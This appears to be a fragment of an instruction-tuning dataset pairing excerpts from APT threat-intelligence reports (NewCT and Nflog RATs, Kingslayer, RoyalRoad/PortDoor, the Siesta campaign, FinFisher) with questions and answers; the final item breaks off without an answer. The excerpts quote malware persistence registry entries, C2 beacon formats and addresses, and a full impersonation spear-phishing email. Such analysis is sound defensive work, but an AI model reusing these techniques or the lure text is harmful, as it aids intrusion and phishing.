    "instruction": "Big Headline: Dropper:\nThis is a first stage payload that  drops and runs the NewCT implant. The first stage payload (example: 46e55cdf507ef10b11d74dad6af8b94e) attempts to detect the number of CPU cores in the\nrunning environment by calling GetSystemInfo as described in the previous section. If the CPU core check detects more than one core, it implants the NewCT2 RAT in %temp%\\MSSoap.DLL (some variants will use BurnDCSrv.DLL and IntelAMTPP.DLL) and executes the written file. The actual implant is packaged in the resource section of the dropper with a fake bitmap (BMP) header, as shown in Figure 8.\nFigure 8:\nDLL implant embedded in resource section with a fake BMP header\nThe implant also creates a registry entry file called named \"Windows.reg\" and imports it the contents of this file into the registry, using the command: \"regedit.exe /s Windows.reg\".\nThese registry entries ensure startup persistence. The contents of \"Windows.reg\" is populated based on the Operating System (OS) which is determined by a call to the GetVersionEx API.\nFigure 9: DLL implant embedded in resource section with a fake BMP header\nBOOL WINAPI GetVersionEx(   _Inout_  LPOSVERSIONINFO lpVersionInfo\n);\n} OSVERSIONINFO;\nIf \"dwBuildNumber\" is equal to 2 (VER_ PLATFORM_WIN32_NT) and \"dwMajorVersion\" is less than 6 (prior to Windows Vista) it adds following entry for persistence:\n[HKEY_CLASSES_ROOT\\CLSID\\{fbeb8a05-beee-4442-804e-409d6c4515e9}\\ InProcServer32]\n@=\"%Temp%\\MSSoap.DLL\"\nOtherwise it creates a copy of itself to %Temp%\\ WmiPrvSer.exe and creates the following entry for persistence:\nHKCU \\Software\\Microsoft\\Windows\\ CurrentVersion\\Run\\\"dllhost\" = %Temp%\\WmiPrvSer.exe\nWe also found some clues in the binary that indicate that the tool was authored and built by someone using Chinese fonts on their computer. It contains resource strings in English but the language is set to Chinese as shown below.\nFigure 10: Embedded string table in resource section with language set to Chinese\nMedium Headline: Implant\nThe implant (example: ccff6e0a6f5e7715bdaf62adf0cbed4f) is called \"NewCT/CT\" RAT. The particular version we analyzed was NewCT version 2. The implant has persistence mechanisms and contains functionality to perform command and control communication. This backdoor also has functionality to load additional plugins from the command and control server. It exports the following two functions:\nSendData\nCreateInstance\nIt creates a mutex \"HFRM_\" to ensure there is only one running copy of the backdoor. It ensures this by checking if the return value from CreateMutexA is 183 (\\xB7), which corresponds to \"ERROR_ALREADY_EXISTS\"9.\nThe payload emits the \"POST\" network beacon shown below along with stub data. The header values are hardcoded in the payload, specifically the values for \"User-Agent\", \"Cache-Control\" and the bytes at offset 0 of the stub (\\xcf\\xcf) may be of interest to network defenders.\n9 http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx\nPOST / HTTP/1.1\nAccept-Language: en-en\nContent-Type: application/octet-stream\nPragma: no-cache\nCache-Control: max-age=259200\nConnection: Close\nContent-Length: 1594\nUser-Agent: Mozilla/4.0\n(compatible; MSIE 6.0;Windows NT 5.1)\nHost: http.jpaols[.]com\\x0d\\x0a\\ x0d\\x0a\\xcf\\xcf...\nThe POST stub contains encrypted data. The encrypted data has two layers of abstraction. It is subjected to a bitwise NOT operation followed by encryption using a randomly generated 4-byte XOR key. The data within the POST stub is constructed in a buffer with a header at offset 0 (\\ x30\\x30) followed by the remote sever, remote port, XOR encrypted data and function call location. The function call location is represented by the textual values shown in the table below and is selected using a switch case statement as shown in Figure 12. It is used by the attacker to track the call path that resulted in the network beacon. The XOR encrypted data contains the MAC Address, hostname and campaign code.\nFigure 12: Call path determined and embedded in network beacon\nFigure 16: DLL Plugin functionality allowing additional payloads to be loaded from the server\nThe call graph for this functionality is shown in Figure 16.\nNewCT RAT evolved from older versions called \"CT\", which has been observed being used in association with the \"Nflog\" Backdoor. The following password-protected document (46ac122183c32858581e95ef40bd31b3) creates a DLL implant called IntelAMTPP.dll (ebd1f5e471774bb283de44e121efa3e5), which is the \"CT\" RAT. In this case, the \"CT\" implant is 10 MB in size, as it has padded null bytes at the end of the file to increase file size in a possible attempt to evade AV engines as described in the previous section on evasion techniques. The \"CT\" implant has identical functionality to \"NewCT\", as observed from the embedded strings.\n00005A58  Connection:close 00005A6C  Cache-Control: maxage=259200\n00005A8C  Pragma: no-cache\n00005AA0  Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)\n00005AD4  Content-Type: application/ octet-stream\n00005AFC  image/gif, image/x-xbitmap, image/jpeg, image/ pjpeg, /\n00005B38  Accept-Language: en-en\nThis version was called \"CT V2.1\" by the author, which may indicate that there were other earlier versions of this RAT and that it was improved upon incrementally. One of the command and control servers used by a variant of this implant is aptly named \"ct.datangcun[.]com\". We do not believe either Moafee or DragonOK have controlled the domain \"ct.datangcun[.] com\", but it was probably controlled by a third group which also used the implant in a separate campaign. The network beacon for version 2.1 is shown below; it uses the same encryption scheme as \"NewCT\":\nPOST / HTTP/1.1\nAccept-Language: en-en\nContent-Type: application/oc-tet-stream\nPragma: no-cache\nCache-Control: max-age=259200\nContent-Length: 1572\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)\nHost: ct.datangcun[.]com:1353\\x0d\\ x0a\\x0d\\x0a\\xcf\\xcf\nWe also observed both attack groups using  campaign codes within this implant and which are listed in Appendix B.  The campaign codes referred to victim countries, attack dates, command and control infrastructure, and other operational codes \u2013 which remain undeciphered.\nMedium Headline: Nflog\nWe have observed DragonOK and Moafee use the Nflog implant in addition to an earlier version of the NewCT2 implant.  The password-protected XLS document (46ac122183c32858581e95ef40bd31b3) referenced earlier also drops an \"Nflog\" implant (a3d3b0686e7bd13293ad0e63ebec67af) in addition to \u2026.. The \"Nflog\" implant emits the following network beacon format:\nPOST /NfLog/Nfile.asp HTTP/1.1 Accept: */*\nUser-Agent: Mozilla/5.0 (compatible; MSIE 7.0;Windows NT 5.1) Host:\nContent-Length: 0\nCache-Control: no-cache\nPOST /NfLog/NfStart.asp?Clien-tId={LocalIP}%20<49d0>%20{Ex-ternalIP}&Nick={Identifier}&d-\ntime=T:8-6-0-53 HTTP/1.1\nAccept: */*\nUse-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\nHost:\nContent-Length: 36\nCache-Control: no-cache\nCookie: ASPSESSIONIDACCARCDD=OKNPG-CKDLEKEHBOHIHLCOMHD\nWe have observed the use of a newer variant of Nflog (example: 3eab5e12f99b47e822721e93639ba1d1) being employed in attacks, which has the beacon format shown below:\nPOST /windowsxp/SNews.asp?HostID={-\nMAC Address} HTTP/1.1\nAccept: /\nCache-Control: no-cache\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\nHost:\nContent-Length: 126\nConnection: Close\nCookie: ASPSESSIONIDAARSSTTB=ECD-DKIAAOHGODEKKFGOKNJCD\nOther URI formats it uses are as follows: /windowsxp/SSports.asp?HostID= /windowsxp/SWeather.asp?HostID= /windowsxp/SJobs.asp?HostID= /windowsxp/STravel.asp?HostID= /windowsxp/NfHostInfo.asp?NickId= /windowsxp/SGames.asp?HostID=\nNote the same User-Agent \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" is used by both\nthe older and newer version of \"Nflog\" samples. We also found code-level similarities in the network communication function code, as well as the data collection function code shown in Figure 17. This strongly suggests that it is an updated version of the \"Nflog\" backdoor.\nFigure 17:\nIdentical data collection function seen in both older and newer Nflog variants\nQ: How does the dropper used by DragonOK ensure persistence across different versions of Windows operating systems?",
    "output": "The dropper ensures persistence by creating a registry entry file named 'Windows.reg' and importing its contents into the registry using the command 'regedit.exe /s Windows.reg'. The specific registry entries created depend on the operating system version, which is determined by a call to the GetVersionEx API. For systems prior to Windows Vista, it adds an entry under HKEY_CLASSES_ROOT\\\\CLSID\\\\{fbeb8a05-beee-4442-804e-409d6c4515e9}\\\\InProcServer32 pointing to '%Temp%\\\\MSSoap.DLL'. For later versions, it creates a copy of itself to '%Temp%\\\\WmiPrvSer.exe' and adds an entry under HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\'dllhost' pointing to '%Temp%\\\\WmiPrvSer.exe'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the decryption process used by the Kingslayer malware to decode the C2 URL, and how does it verify the integrity of the downloaded data?",
    "output": "The Kingslayer malware decrypts the previously set MailID variable using a base64 decode followed by an MD5 hashing algorithm. It sets a seed byte based on the first byte of the decoded text. Each byte of the text is XOR decrypted against its respective byte in the MD5 sum and then further XOR decrypted by the seed byte. The decoded C2 URL from this sample is http://www.oraclesoft[.]net/mailcheck.png. To verify the integrity of the downloaded data, the malware checks if the first two bytes are decimal 77 90 (0x4D5A), ensuring the data is a valid executable binary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: A Examples of targeted e-mails\nIn this section, we provide specific examples of e-mails that would be assigned targeting scores described in Section 4.2.2.\nTargeting Score 1 (Targeted Not customized). The email in Figure 6 was sent to Tibet group 1. The message content and sender are vague and do not relate to the interest of the group. The attachment is a word document implanted with malware. The lack of relevant information in this message gives it a score of 1 (targeted, not customized).\nTargeting Score 2 (Targeted, Poorly Customized). The e-mail in Figure 7 was sent to Tibet group 1. It references Tibetan self-immolations which is an issue of interest to the group. However, the sender does not appear to be from a real person or organization. The message content is terse and does not referenced information that can be externally validated. Therefore this message scores a 2 (targeted, poorly customized).\nFrom: Palden Sangpo\nFigure 8: Example of e-mail with Targeting Score 3\nTargeting Score 3 (Targeted Customized). The email in Figure 8 was sent to Tibet group 2. On the surface it appears to be a professional e-mail from \"Palden Sangpo\" a consultant at the Tibet Career Centre. The e-mail sender address and signature reference accurate contact details that can be easily verified through an Internet search. However, the e-mail headers reveal the purported e-mail sender address is fraudulent and the actual sender was albano_kuqo@gmx.com. The e-mail generally addresses the organization rather than the individual recipient. Therefore this message scores a 3 (targeted, customized).\nTargeting Score 4 (Targeted Personalized). The email in Figure 9 was sent to Tibet group 1. It is directly addressed to the director of the group and appears to come from Mr. Cheng Li, a prominent China scholar based at the Brookings Institute. The e-mail address is made to appear to be from Mr. Cheng Li, but from an AOL account (chengli.brookings@aol.com) that was registered by the attackers. The message asks the recipient for information on recent Tibetan self-immolations. The level of customization and personalization used in\nFrom: Cheng Li <chengli.brookings@aol.com> Subject:Happy Tib Losar and Ask You a Favour\n23 Feb 2012\nTo: [Tibet Group 1]\nDear [Redacted]\nI am Cheng Li from John L. Thornton China Center of Brookings. I will attend an annual meeting on Religious Research with CIIS in Shanghai next week, and plan to take the chance to visit Tibet. Attached is a list of tibetans who have self-immolated from 2009 which my assistant prepared for me, but i am not sure of its accuracy. Would you please have a look and make necessary corrections. I will be really much appreciated if you could do me the favor and offer some more information about the latest happenings inside tibet.\nThank you again and happy Tib losar!\nCheng Li\nDirector of Research, John L. Thornton\nChina Center\nBrookings Institution\n1 Attachment: list_of_self_immolations. xls\nFigure 9: Example of e-mail with Targeting Score 4\nthis message gives it a score of 4 (targeted, personalized).\nTargeting Score 5 (Targeted Highly Personalized). Targeting scores of 5 (targeted, highly personalized) require reference to internal information to the target organization that could not be obtained through open sources. Examples of messages scoring at this level include an e-mail that purported to come from a funder of China Group 3 that provided details of an upcoming meeting the group actually had scheduled with the funder. In another example, Tibet Group 2 and Tibet Group 3 received separate e-mails that contained specific personal details about a South African group's visit to Dharam-sala, India that appear to have been repurposed from a real private communication. The malicious attachment contained an authentic travel itinerary, which would be displayed after the user opened the document. The private information used in these messages suggest that the attackers performed significant reconnaissance of these groups and likely obtained the information through prior compromise.\n\nQuestion: What are the key indicators that differentiate between various levels of social engineering sophistication in targeted emails? How can these indicators help cybersecurity experts in identifying and mitigating such threats?\n\nAnswer:",
    "output": "Key indicators that differentiate between various levels of social engineering sophistication in targeted emails include the relevance of the message content, the authenticity of the sender, the level of customization, and the presence of internal information. These indicators help cybersecurity experts in identifying and mitigating threats as follows:\\n\\n- **Relevance of Message Content:** Emails with vague or irrelevant content (Score 1) are easier to detect compared to those that reference specific issues of interest to the group (Score 2).\\n\\n- **Authenticity of Sender:** Emails with fraudulent sender addresses or signatures that can be easily verified (Score 3) require closer inspection of email headers to detect discrepancies.\\n\\n- **Level of Customization:** Emails that are personalized to individual recipients and reference specific events or requests (Score 4) indicate a higher level of sophistication and require more advanced detection methods.\\n\\n- **Presence of Internal Information:** Emails containing internal information that could not be obtained through open sources (Score 5) suggest significant reconnaissance and likely prior compromise, necessitating thorough investigation and enhanced security measures.\\n\\nBy understanding these indicators, cybersecurity experts can develop strategies to educate users on recognizing suspicious emails, implement tools to check email headers and links for malware, and enhance overall security practices to protect against targeted malware campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Key Findings\nRoyalRoad Variants are Under Development: The variant of the RoyalRoad weaponizer examined altered its encoded payload from the known \"8.t\" file to a new filename: \"e.o\". More new variants are likely to be under development as well.\nPreviously Undocumented Backdoor: The newly discovered RoyalRoad RTF variant examined also drops a previously undocumented and stealthy backdoor dubbed PortDoor which is designed with obfuscation and persistence in mind.\nHighly Targeted Attack: The threat actor is specifically targeting the Rubin Design Bureau, a part of the Russian defense sector designing submarines for the Russian Federation's Navy.\nExtensive Malware Capabilities: Portdoor has multiple functionalities, including the ability to do reconnaissance, target profiling, delivery of additional payloads, privilege escalation, process manipulation static detection antivirus evasion, one-byte XOR encryption, AES-encrypted data exfiltration and more.\nAPT Group Operating on Behalf of Chinese State Interests: The accumulated evidence such as the infection vector, social engineering style, use of RoyalRoad against similar targets, and other similarities between the newly discovered backdoor sample and other known Chinese APT malware all bear the hallmarks of a threat actor operating on behalf of Chinese state-sponsored interests.\nMedium Headline: Historical RTF data from VirusTotal\nOnce the RTF document is opened and executed, a  is dropped to the Microsoft Word startup folder. This technique is used by various actors to bypass detection of automatic execution persistence, since Word must be relaunched in order to trigger the add-in file, making the persistence mechanism less \"noisy\".\nContrary to the common \"8.t\" file name (<https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html>)observed in most RoyalRoad payloads, this new RoyalRoad variant uses \"e.o\" naming convention for the temporary file payload, which is eventually written to MS Word startup folder as \"winlog.wll\":\nWeaponized RTF execution and dropped files on disk\nThe malicious execution of the RTF file is detected by the (<https://www.cybereason.com/platform#graphic>)Cybereason Defense Platform:\nCybereason Detection of the PortDoor Backdoor\nBig Headline: PortDoor Backdoor Analysis\nThe dropped payload, named \"winlog.wll\", is a previously undocumented backdoor. Its main capabilities include:\nGathering reconnaissance and profiling of the victim's machine\nReceiving commands and downloading additional payloads from the C2 server\nCommunicating with the C2 server using raw socket as well as HTTP over port 443 with proxy authentication support\nPrivilege escalation and process manipulation\nDynamic API resolving for static detection evasion\nOne byte XOR encryption of sensitive data and configuration strings\nThe collected information is AES-encrypted before it is sent to the C2 server\nMedium Headline: Value written to the \"58097616.tmp\" file\nThis can be used as an additional identifier for the target, and also as a placeholder for the previous presence of this malware.\nThe malware then proceeds to attempt to establish a connection with the C2 which supports the transfer of data using TCP over raw sockets, or HTTPS using the CONNECT method. In addition the backdoor appears to be proxy-aware, distinguishing between two HTTP response types: \"200\" response and \"407\" (Proxy Authentication Required):\nBig Headline: Attribution\nAt the time of this analysis, there was not enough information available to attribute the newly discovered backdoor to a known threat actor with reasonable certainty. However, there are a couple of known Chinese APT groups that share quite a few similarities with the threat actor behind the new malware samples analyzed in this blog.\nBased on previous work done by , the Nocturnus Team was able to determine that the RTF file discussed in this blog was weaponized with RoyalRoad v7, which bears the indicative \"b0747746\" header encoding and was previously observed being used by the Tonto Team, TA428 and Rancor threat actors, as can be seen below:\nRoyalRoad attribution matrix. Credit: nao_sec\nBoth the Tonto Team and TA428 threat actors have been observed attacking Russian organizations in the past, and more specifically attacking research and defense related targets. For example, it was previously reported that Tonto Team is known to have (<https://blog.talosintelligence.com/2020/03/bisonal-10-years-of-play.html>)attacked Russian organizations in the past using the  malware.\nThe newly discovered backdoor does not seem to share significant code similarities with previously known malware used by the abovementioned groups, other than anecdotal similarities that are quite common to backdoors, leading us to the conclusion that it is not a variant of a known malware, but is in fact novel malware that was developed recently.\nLastly, we are also aware that there could be other groups, known or yet unknown, that could be behind the attack and the development of the PortDoor backdoor. We hope that as time goes by, and with more evidence gathered, the attribution could be more concrete.\nBig Headline: Conclusion\nRoyalRoad has been one of the most used RTF weaponizers in the Chinese threat actors sphere in recent years. It is mostly observed in the initial compromise phase of targeted attacks where spear-phishing is used to lure victims into opening malicious documents which in turn exploit Microsoft Equation Editor vulnerabilities to drop different malware.\nIn this report, we discussed the latest changes that were made to the RoyalRoad weaponizer that deviate from some of its well-documented and predictable indicators. It is perhaps an indication that the threat actors who are operating it are attempting to avoid \"low hanging fruit\" detections.\nIn addition, we reported the discovery of the novel PortDoor backdoor, a previously undocumented and stealthy tool designed to grant the attackers access to their targets' machines, collect information, and deploy additional payloads.\nAt the time of writing this report, it is still unclear which threat actor is behind the new backdoor, however we have identified two potential suspects that fit the profile. Currently there is not enough information available to prove the stated hypothesis with a high level of certainty.\nLOOKING FOR THE IOCs? CLICK ON THE CHATBOT DISPLAYED IN LOWER-RIGHT OF YOUR SCREEN.\n\nHow does the new variant of the RoyalRoad weaponizer differ from the known '8.t' file, and what implications does this have for detection mechanisms?",
    "output": "The new variant of the RoyalRoad weaponizer alters its encoded payload from the known '8.t' file to a new filename: 'e.o'. This change indicates that more new variants are likely under development. The implication for detection mechanisms is that traditional signatures and indicators based on the '8.t' file may no longer be effective, requiring security teams to update their detection strategies to account for these new filenames and techniques.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Siesta Campaign: A Case Study\nWe are currently investigating an incident that involved attackers sending out spear-phishing emails addressed to executives of an undisclosed company. These emails were sent from spoofed email addresses of personnel within the organization. Instead of using attachments and document exploits, this specific campaign served their malware through a legitimate-looking file download link.\nTo lure the target into downloading the file, the attacker serves the archive under a URL path named after the target organization's name as cited below:\nhttp://{malicious domain}/{organization name}/{legitimate archive name}.zip\nThis archive contains an executable (TROJ_SLOTH) disguised as a PDF document. When executed, it drops and opens a valid PDF file, which was most probably taken from the target organization's website. Along with this valid PDF file, another malicious component is also dropped and executed in the background.\nThis backdoor component is named google{BLOCKED}.exe. (Due to the ongoing investigation, we are\nunfortunately unable to share hashes and filenames at this time.) This backdoor connects to http://www.micro{BLOCKED}. com/index.html, which are its command-and-control (C&C) servers. Trend Micro identifies these samples as BKDR_SLOTH.B.\nAt this point, the malware begins waiting for additional commands from the attacker. The encrypted commands that are accepted are:\nSleep:\nCommands the backdoor to sleep for specified number of minutes\nWe have received a sleep command of \"sleep:120\" during our analysis which means that the malware will wait for 2hrs before establishing a connection again to the C&C server\nDownload: <download_url>\nCommands the backdoor to download and execute a file (most probably another Win32 executable) from a specified URL\nThe C&C servers used in this campaign are found to be newly registered and also short-lived, making it difficult for us to track the malware's behavior.\nBased on our research, we found 2 variants of the malware used in this campaign. Although not exactly alike, the behaviors are nearly identical.\nOne of the similar samples is a file named Questionaire Concerning the Spread of Superbugs February 2014.exe (SHA1: 014542eafb792b98196954373b3fd13e60cb94fe). This sample drops the file UIODsevr.exe, its backdoor component which behaves similarly as BKDR_SLOTH.B with the addition of communicating to its C&C at skys{BLOCKED}com. These samples are identified by Trend Micro as (<http://about-threats.trendmicro.com/us/malware/BKDR_SLOTH.A>)BKDR_SLOTH.A.\nBoth variants excessively use Sleep calls, which renders the malware dormant for varying periods of time, hence the campaign name \"Siesta\" (which means to take a short nap in Spanish). Commands are being served through HTML pages using different keywords as listed below:\nBig Headline: Attribution\nAttribution of campaigns and attack methods can often be difficult. We were able to identify this new campaign through inspecting hashes, C&Cs, registrants, commands, and additional information.\nDuring the course of our investigation into this new campaign, we investigated the malware dropped. We quickly noticed the registrant of sky{BLOCKED}.com is also the same registrant as\nmicro{BLOCKED}.com and ifued{BLOCKED}.net. This individual used the name Li Ning and others with an email address of xiaomao{BLOCKED}@163.com. This individual also recently registered 79 additional domains. There are a total of roughly 17,000 domains registered with this same email address.\nBig Headline: Conclusion\nEarly detection is crucial in preventing targeted attacks from exfiltrating confidential company data. Organizations and large enterprises need an advanced threat protection platform like Trend Micro\u2122 Deep Discovery, which can mitigate the risks posed by targeted attacks through its various security technologies and global threat intelligence. At the heart of our Custom Defense solution is Deep Discovery which provides real-time local and global intelligence across the attack life cycle. This can help IT administrators understand the nature of the attack they are dealing with.\nTrend Micro blocks all related threats, emails and URLs associated with these attacks. As always, we advise users to exercise caution when opening emails and links.\nWith additional insights and analysis from Kervin Alintanahin, Dove Chiu, and Kyle Wilhoit.\n\nBased on the above text, answer a question. In the Siesta Campaign, how did the attackers utilize social engineering techniques to deliver their malware, and what specific methods did they employ to disguise the malicious components?",
    "output": "The attackers in the Siesta Campaign utilized social engineering techniques by sending spear-phishing emails to executives of an undisclosed company. These emails were sent from spoofed email addresses of personnel within the organization. Instead of using attachments and document exploits, the attackers served their malware through a legitimate-looking file download link. To lure the target into downloading the file, the attacker served the archive under a URL path named after the target organization's name. The archive contained an executable (TROJ_SLOTH) disguised as a PDF document. When executed, it dropped and opened a valid PDF file, which was most likely taken from the target organization's website. Along with this valid PDF file, another malicious component, named google{BLOCKED}.exe, was also dropped and executed in the background.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What evidence indicates that Etumbot is used in conjunction with IXESHE malware, and what are some of the shared C&C infrastructure details?",
    "output": "Several Etumbot samples connect directly to IP addresses that are also used by IXESHE-related malware, indicating that Etumbot is often used in tandem with IXESHE. For example, the domain finance[.]yesplusno[.]com and IP address 211[.]53.164.152 have been used by both Etumbot and IXESHE samples. The registrant for the domain yesplusno[.]com is listed as 'alice yoker' with the email address 'chuni_fan@sina.com'. Other domains registered in this name have also been used as C&C for IXESHE, such as securezone[.]yesplusno[.]com, prishmobile[.]googlesale[.]net, and yahoopush[.]googlesale[.]net. Additionally, the IP address 98.188.111.244 has been used as a C&C for multiple IXESHE samples, beginning in at least March 2013 and observed as recently as March 2014 with an Etumbot sample.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: FinFisher's Global Proliferation\nMorgan Marquis-Boire, Bill Marczak, Claudio Guarnieri, and John Scott-Railton.\nThis post describes the results of a comprehensive global Internet scan for the command and control servers of FinFisher's surveillance software. It also details the discovery of a campaign using FinFisher in Ethiopia used to target individuals linked to an opposition group. Additionally, it provides examination of a FinSpy Mobile sample found in the wild, which appears to have been used in Vietnam.\nBig Headline: 1. SUMMARY OF KEY FINDINGS\n\uf0b7 We have found command and control servers for FinSpy backdoors, part of Gamma International's FinFisher \"remote monitoring solution,\" in a total of 25 countries: Australia, Bahrain, Bangladesh, Brunei, Canada, Czech Republic, Estonia, Ethiopia, Germany, India, Indonesia, Japan, Latvia, Malaysia, Mexico, Mongolia, Netherlands, Qatar, Serbia, Singapore, Turkmenistan, United Arab Emirates, United Kingdom, United States, Vietnam.\n\uf0b7 A FinSpy campaign in Ethiopia uses pictures of Ginbot 7, an Ethiopian opposition group, as bait to infect users. This continues the theme of FinSpy deployments with strong indications of politically-motivated targeting.\n\uf0b7 There is strong evidence of a Vietnamese FinSpy Mobile Campaign. We found an Android FinSpy Mobile sample in the wild with a command & control server in Vietnam that also exfiltrates text messages to a local phone number.\n\uf0b7 These findings call into question claims by Gamma International that previously reported servers were not part of their product line, and that previously discovered copies of their software were either stolen or demo copies.\nMedium Headline: FINFISHER: UPDATED GLOBAL SCAN\nAround October 2012, we observed that the behavior of FinSpy servers began to change. Servers stopped responding to our fingerprint, which had exploited a quirk in the distinctive FinSpy wire protocol. We believe that this indicates that Gamma either independently changed the FinSpy protocol, or was able to determine key elements of our fingerprint, although it has never been publicly revealed.\nIn the wake of this apparent update to FinSpy command & control servers, we devised a new fingerprint and conducted a scan of the internet for FinSpy command & control servers. This scan took roughly two months and involved sending more than 12 billion packets. Our new scan identified a total of 36 FinSpy servers, 30 of which were new and 6 of which we had found during previous scanning. The servers operated in 19 different countries. Among the FinSpy servers we found, 7 were in countries we hadn't seen before.\nSmall Headline: New Countries\nCanada, Bangladesh, India, Malaysia, Mexico, Serbia, Vietnam\nIn our most recent scan, 16 servers that we had previously found did not show up. We suspect that after our earlier scans were published the operators moved them. Many of these servers were shut down or relocated after the publication of previous results, but before the apparent October 2012 update. We no longer found FinSpy servers in 4 countries where previous scanning identified them (Brunei, UAE, Latvia, and Mongolia). Taken together, FinSpy servers are currently, or have been present, in 25 countries.\nAustralia, Bahrain, Bangladesh, Brunei, Canada, Czech Republic, Estonia, Ethiopia, Germany, India, Indonesia, Japan, Latvia, Malaysia, Mexico, Mongolia, Netherlands, Qatar, Serbia, Singapore, Turkmenistan, United Arab Emirates, United Kingdom, United States, Vietnam.\nImportantly, we believe that our list of servers is incomplete due to the large diversity of ports used by FinSpy servers, as well as other efforts at concealment. Moreover, discovery of a FinSpy command and control server in a given country is not a sufficient indicator to conclude the use of FinFisher by that country's law enforcement or intelligence agencies. In some cases, servers were found running on facilities provided by commercial hosting providers that could have been purchased by actors from any country.\nThe table below shows the FinSpy servers detected in our latest scan. We list the full IP address of servers that have been previously publicly revealed. For active servers that have not been publicly revealed, we list the first two octets only. Releasing complete IP addresses in the past has not proved useful, as the servers are quickly shut down and relocated.\nSeveral of these findings are especially noteworthy:\n\uf0b7 Eight servers are hosted by provider GPLHost in various countries (Singapore, Malaysia, Australia, US). However, we observed only six of these servers active at any given time, suggesting that some IP addresses may have changed during our scans.\n\uf0b7 A server identified in Germany has the registrant \"Gamma International GmbH,\" and the contact person is listed as \"Martin Muench.\"\n\uf0b7 There is a FinSpy server in an IP range registered to \"Verizon Wireless.\" Verizon Wireless sells ranges of IP addresses to corporate customers, so this is not necessarily an indication that Verizon Wireless itself is operating the server, or that Verizon Wireless customers are being spied on.\n\uf0b7 A server in Qatar that was previously detected by Rapid7 seems to be back online after being unresponsive during the last round of our scanning. The server is located in a range of 16 addresses registered to \"Qtel \u2013 Corporate accounts \u2013 Government Relations.\" The same block of 16 addresses also contains the website .\nMedium Headline: 3.1 FinSpy in Ethiopia\nWe analyzed a recently acquired malware sample and identified it as FinSpy. The malware uses images of members of the Ethiopian opposition group, Ginbot 7, as bait. The malware communicates with a FinSpy Command & Control server in Ethiopia, which was first identified by Rapid7 in August 2012. The server has been detected in every round of scanning, and remains operational at the time of this writing. It can be found in the following address block run by Ethio Telecom, Ethiopia's state-owned telecommunications provider:\nIP: 213.55.99.74\nroute: 213.55.99.0/24\ndescr: Ethio Telecom\norigin: AS24757\nmnt-by: ETC-MNT\nmember-of: rs-ethiotelecom\nsource: RIPE # Filtered\nThe server appears to be updated in a manner consistent with other servers, including servers in Bahrain and Turkmenistan.\nThe sample is similar to of FinSpy malware sent to activists in Bahrain in 2012. Just like Bahraini samples, the malware relocates itself and drops a JPG image with the same filename as the sample when executed by an unsuspecting user. This appears to be an attempt to trick the victim into believing the opened file is not malicious. Here are a few key similarities between the samples:\n\uf0b7 The PE timestamp \"2011-07-05 08:25:31\" of the packer is exactly the same as the Bahraini sample.\n\uf0b7 The following string (found in a process infected with the malware), self-identifies the malware and is similar to strings found in the Bahraini samples:\n\uf0b7\n\uf0b7 The samples share the same Bootkit, SHA-256: ba21e452ee5ff3478f21b293a134b30ebf6b7f4ec03f8c8153202a740d7978b2.\n\uf0b7 The samples share the same driverw.sys file, SHA-256: 62bde3bac3782d36f9f2e56db097a4672e70463e11971fad5de060b191efb196.\nIn this case the picture contains photos of members of the Ethiopian opposition group, . Controversially, Ginbot 7 was designated a terrorist group by the Ethiopian Government in 2011. The Committee to Protect Journalists (CPJ) and Human Rights Watch have both , CPJ has pointed out that it is having a chilling effect on legitimate political reporting about the group and its leadership.\nThe existence of a FinSpy sample that contains Ethiopia-specific imagery, and that communicates with a still-active command & control server in Ethiopia strongly suggests that the Ethiopian Government is using FinSpy.\nMedium Headline: 3.2 FinSpy Mobile in Vietnam\nWe recently obtained and analyzed a malware sampleand identified it as FinSpy Mobile for Android. The sample communicates with a command & control server in Vietnam, and exfiltrates text messages to a Vietnamese telephone number.\nThe FinFisher suite includes mobile phone versions of FinSpy for all major platforms including iOS, Android, Windows Mobile, Symbian and Blackberry. Its features are broadly similar to the PC version of FinSpy identified in Bahrain, but it also contains mobile-specific features such as GPS tracking and functionality for silent 'spy' calls to snoop on conversations near the phone. An in-depth analysis of the FinSpy Mobile suite of backdoors was provided in an earlier blog post:\nThe sample included a configuration filethat indicates available functionality, and the options that have been enabled by those deploying it:\nInterestingly, the configuration file also specifies a Vietnamese phone number used for SMS based command and control:\nSection Type: TlvTypeConfigSMSPhoneNumber\nSection Data: \"+841257725403\"\nThe command and control server is in a range provided by the CMC Telecom Infrastructure Company in Hanoi:\nIP Address: 183.91.2.199\ninetnum: 183.91.0.0 \u2013 183.91.9.255\nnetname: FTTX-NET\ncountry: Vietnam\naddress: CMC Telecom Infrastructure Company\naddress: Tang 3, 16 Lieu Giai str, Ba Dinh, Ha Noi\nThis server was active until very recently and matched our signatures for a FinSpy command and control server. Both the command & control server IP and the phone number used for text-message exfiltration are in Vietnam which indicates a domestic campaign.\nThis apparent FinSpy deployment in Vietnam is troubling in the context of recent threats against online free expression and activism. In 2012, Vietnam introduced new censorship laws amidst an ongoing harassment, intimidation, and detention campaign against of bloggers who spoke out against the regime. This culminated in the trial of 17 bloggers, 14 of whom were recently convicted and sentenced to terms ranging from 3 to 13 years.\nQuestion: What challenges do researchers face in accurately identifying and attributing the use of FinSpy servers to specific countries or entities?",
